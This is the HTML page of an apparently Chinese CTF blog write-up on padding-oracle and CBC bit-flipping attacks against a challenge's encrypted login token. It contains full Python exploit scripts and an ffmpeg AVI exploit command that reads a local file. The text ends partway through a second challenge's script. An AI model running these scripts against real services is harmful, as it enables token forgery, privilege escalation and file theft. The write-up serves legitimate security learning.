@@ -1,0 +1,1242 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/black/pace-theme-flash.css" rel="stylesheet">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon2.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon2.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="padding oracle 原理: https://www.freebuf.com/articles/database/150606.html [CISCN2019 东北赛区 Day2 Web3]Point System 打开是一个登录界面, 访问robots.txt, 发现一个html, 里面是很多api  试着按照里面的使用方法来注册一个用户, 然后回到登录界面登录提示权限不足, 看看浏览器">
+<meta name="keywords" content="CTF WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="padding_oracle 和 cbc字节反转">
+<meta property="og:url" content="http://yoursite.com/2020/02/03/padding-oracle-and-cbc-attack/index.html">
+<meta property="og:site_name" content="CH4SER || 自闭室">
+<meta property="og:description" content="padding oracle 原理: https://www.freebuf.com/articles/database/150606.html [CISCN2019 东北赛区 Day2 Web3]Point System 打开是一个登录界面, 访问robots.txt, 发现一个html, 里面是很多api  试着按照里面的使用方法来注册一个用户, 然后回到登录界面登录提示权限不足, 看看浏览器">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/image-20200203003409598.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200203004257291.png">
+<meta property="og:image" content="http://yoursite.com/images/15078975303136.png">
+<meta property="og:image" content="http://yoursite.com/images/15078976262418.png!small">
+<meta property="og:image" content="http://yoursite.com/images/15078975303136.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200202225510224.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200203014414962.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/62346910-70f6ff00-b52a-11e9-9827-95e90cbebd1d.png">
+<meta property="og:updated_time" content="2020-02-03T08:50:44.425Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="padding_oracle 和 cbc字节反转">
+<meta name="twitter:description" content="padding oracle 原理: https://www.freebuf.com/articles/database/150606.html [CISCN2019 东北赛区 Day2 Web3]Point System 打开是一个登录界面, 访问robots.txt, 发现一个html, 里面是很多api  试着按照里面的使用方法来注册一个用户, 然后回到登录界面登录提示权限不足, 看看浏览器">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20200203003409598.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/03/padding-oracle-and-cbc-attack/">
+
+
+
+
+
+  <title>padding_oracle 和 cbc字节反转 | CH4SER || 自闭室</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CH4SER || 自闭室</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">志之难也,不在胜人,而在自胜.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/padding-oracle-and-cbc-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ch4ser">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/dogdog.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CH4SER || 自闭室">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">padding_oracle 和 cbc字节反转</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-03T16:42:20+08:00">
+                2020-02-03
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2020-02-03T16:50:44+08:00">
+                2020-02-03
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>padding oracle 原理: <a href="https://www.freebuf.com/articles/database/150606.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/150606.html</a></p>
+<h2 id="CISCN2019-东北赛区-Day2-Web3-Point-System">[CISCN2019 东北赛区 Day2 Web3]Point System</h2>
+<p>打开是一个登录界面, 访问<code>robots.txt</code>, 发现一个html, 里面是很多api</p>
+<p><img src="/images/image-20200203003409598.png" alt="image-20200203003409598"></p>
+<p>试着按照里面的使用方法来注册一个用户, 然后回到登录界面登录提示权限不足, 看看浏览器的network</p>
+<p><img src="/images/image-20200203004257291.png" alt="image-20200203004257291"></p>
+<p>除了向login和info都请求了一次, 看看详情</p>
+<p>向login发请求后返回的是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:100,&quot;data&quot;:&#123;&quot;token&quot;:&quot;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>向info请求的头中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: Key=eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9</span><br></pre></td></tr></table></figure>
+<p>请求后返回的是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:100,&quot;data&quot;:&#123;&quot;user_role&quot;:3,&quot;uid&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>token解码一下看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;signed_key&quot;:&quot;SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1Z6lcvRnqAYZRBazce+5X7tRI6GlkrCUKZo/j72qvq9N4GeSisj3BVYYvt8Y3VFPwktIDysmCJMtJ7EAkYH5SE/w==&quot;,&quot;role&quot;:3,&quot;user_id&quot;:1,&quot;payload&quot;:&quot;LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv&quot;,&quot;expire_in&quot;:1580668951&#125;</span><br></pre></td></tr></table></figure>
+<p>sign_key解码看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ICxkSingDanceRaP&#123;A%EÒôõç!SY&quot;Á!nÉZß|ÿíYêW/FzaAk7ûûµ:Y+	B£øûÚ«êôÞy(¬pUaíñÕü$´ò²`2Ò&#123;	ÿ</span><br></pre></td></tr></table></figure>
+<p>“我蔡徐坤唱跳rap”…然后后面是乱码, 这个玩意就是<strong>cbc加密的特征</strong>, 那么signed_key就是cbc加密后经过base64的密文, 还得用<code>padding oracle attack</code>解出明文来</p>
+<p>解密过程:</p>
+<p><img src="/images/15078975303136.png" alt="img"></p>
+<p><img src="/images/15078976262418.png!small" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C1 ^ 中间值的最后一位 = 0×01</span><br><span class="line">中间值的最后一位 = C1 ^ 0×01</span><br><span class="line"></span><br><span class="line">C1 ^ 中间值的最后2位 = 0×02 0x02</span><br><span class="line">中间值的最后2位 = C1 ^ (0×02 0x02)</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">一直到推出整个C2的中间值,和C1异或就得到了C2的明文</span><br></pre></td></tr></table></figure>
+<p>同理, 可以破解整个明文</p>
+<p>这是从其他师傅偷过来的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"938a4575-3337-42bd-b712-45b008d529c5.node3.buuoj.cn"</span></span><br><span class="line">port = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(key)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    signed_key_decoded = base64.b64decode(signed_key)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">"http://"</span> + host + <span class="string">"/frontend/api/v1/user/info"</span></span><br><span class="line"></span><br><span class="line">    N = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    total_plain = <span class="string">''</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> range(<span class="number">0</span>, len(signed_key_decoded) // <span class="number">16</span> - <span class="number">1</span>):</span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        get = <span class="string">b""</span></span><br><span class="line">        <span class="comment"># 对每一块密文</span></span><br><span class="line">        cipher = signed_key_decoded[<span class="number">16</span> + block * <span class="number">16</span>:<span class="number">32</span> + block * <span class="number">16</span>]</span><br><span class="line">        <span class="comment"># 对每一位</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 爆破</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">                time.sleep(<span class="number">0.1</span>)</span><br><span class="line">                <span class="comment"># 已知位的padding对应的解密异或值</span></span><br><span class="line">                padding = <span class="string">b""</span>.join([(get[n] ^ i).to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) <span class="keyword">for</span> n <span class="keyword">in</span> range(len(get))])</span><br><span class="line">                <span class="comment"># 将解密异或值 和 这块密文作为一个signed_key尝试进行解密</span></span><br><span class="line">                c = <span class="string">b'\x00'</span> * (<span class="number">16</span> - i) + j.to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) + padding + cipher</span><br><span class="line">                <span class="comment">#print(c)</span></span><br><span class="line">                token = base64.b64encode(c)</span><br><span class="line">                user_key_json_decode[<span class="string">'signed_key'</span>] = token.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">                header = &#123;<span class="string">'Key'</span>: base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">"utf-8"</span>))&#125;</span><br><span class="line">                res = requests.get(url, headers=header)</span><br><span class="line">                <span class="comment">#print(res.text, j)</span></span><br><span class="line">                print(res.json())</span><br><span class="line">                <span class="comment"># 205在测试的时候就是解密不成功, 其他的情况要么是解密成功但是不符合要求和符和要求的</span></span><br><span class="line">                <span class="keyword">if</span> res.json()[<span class="string">'code'</span>] != <span class="number">205</span>:</span><br><span class="line">                    get = (j ^ i).to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) + get</span><br><span class="line">                    print(get, i)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                    </span><br><span class="line">		<span class="comment"># 这里存疑, 为什么是不是signed_key_decoded[(block+1)*16 + i]呢</span></span><br><span class="line">        plain = <span class="string">b""</span>.join([(get[i] ^ signed_key_decoded[block * <span class="number">16</span> + i]).to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)])</span><br><span class="line">        print(plain.decode(<span class="string">"utf-8"</span>), <span class="string">"block=%d"</span> % block)</span><br><span class="line">        total_plain += plain.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        print(total_plain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total_plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plain_text = padding_oracle(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9"</span>)</span><br><span class="line">print(plain_text)</span><br></pre></td></tr></table></figure>
+<p>慢慢的可以跑出来明文, (假装跑出来了, 其实因为buu的防护请求多了直接断开连接, 但是可以跑出几位)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;role&quot;:3,&quot;user_id&quot;:1,&quot;payload&quot;:&quot;LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv&quot;,&quot;expire_in&quot;:1580668951&#125;</span><br></pre></td></tr></table></figure>
+<p>那么这个<code>signed_key</code>就是给后面的明文作为一个验证使用.</p>
+<p>之前的那个没有权限登录, 就是这个<code>role</code>的关系, 要把它修改成1 , 就要把密文也修改了, 利用<code>cbc字节反转攻击</code>来修改密文.</p>
+<p><img src="/images/15078975303136.png" alt="img"></p>
+<p>由于要修改的明文只是在第一区块中, 因此只需要修改IV就行了, 设 原明文为PB, 修改后的明文为PA</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C[i] ^ PB[i] = IV[i]</span><br><span class="line">C[i] ^ PA[i] = new_IV[i]</span><br><span class="line"></span><br><span class="line">C[i] = PB[i] ^ IV[i]</span><br><span class="line">PB[i] ^ PA[i] ^ IV[i] = new_IV[i]</span><br></pre></td></tr></table></figure>
+<p>还是偷来的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"dd8b9a48-d183-45ea-831c-2fe0eb2b7e29.node3.buuoj.cn"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_attack</span><span class="params">(key, block, origin_content, target_content)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line"></span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    cipher_o = base64.b64decode(signed_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block &gt; <span class="number">0</span>:</span><br><span class="line">        iv_prefix = cipher_o[:block * <span class="number">16</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        iv_prefix = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    iv = cipher_o[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    cipher = cipher_o[<span class="number">16</span> + block * <span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    iv_array = bytearray(iv)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])</span><br><span class="line"></span><br><span class="line">    iv = bytes(iv_array)</span><br><span class="line"></span><br><span class="line">    user_key_json_decode[<span class="string">'signed_key'</span>] = base64.b64encode(iv_prefix + iv + cipher)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_info</span><span class="params">(key)</span>:</span></span><br><span class="line">    r = requests.post(<span class="string">"http://"</span> + host +  <span class="string">"/frontend/api/v1/user/info"</span>, headers = &#123;<span class="string">"Key"</span>: key&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"获取成功！"</span>)</span><br><span class="line">    <span class="keyword">return</span> r.json()[<span class="string">'data'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_role_palin</span><span class="params">(key, role)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(user_key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    user_key_json_decode[<span class="string">'role'</span>] = role</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"翻转 Key:"</span>)</span><br><span class="line">user_key = cbc_attack(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9"</span>, <span class="number">0</span>, <span class="string">'&#123;"role":3,"user_'</span>, <span class="string">'&#123;"role":1,"user_'</span>)</span><br><span class="line">user_key = modify_role_palin(user_key, <span class="number">1</span>)</span><br><span class="line">print(user_key)</span><br><span class="line">print(<span class="string">"测试拉取用户信息："</span>)</span><br><span class="line">user_info = get_user_info(user_key)</span><br><span class="line">print(user_info)</span><br></pre></td></tr></table></figure>
+<p>改完后把新的密文作为<code>key</code>访问, 刷新页面, 成功登录, 发现音频上传的功能.看赵师傅wp说<strong>上传不同类型的文件然后下载上传的文件(如下图上传后可以在network中发现url), 对比上传前后文件的md5值发现对avi文件有进行处理</strong>, 这个姿势学到了.</p>
+<p><img src="/images/image-20200202225510224.png" alt="image-20200202225510224"></p>
+<p>猜测后台使用ffmpeg来对音视频进行处理(misc的东西我一点猜不到), 然后使用对应的漏洞</p>
+<p><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gen_xbin_avi.py file:///flag test.avi</span><br></pre></td></tr></table></figure>
+<p>上传, 下载, 播放, 发现flag</p>
+<p><img src="/images/image-20200203014414962.png" alt="image-20200203014414962"></p>
+<h2 id="实验吧-简单的登陆题">实验吧 简单的登陆题</h2>
+<p>真难</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span 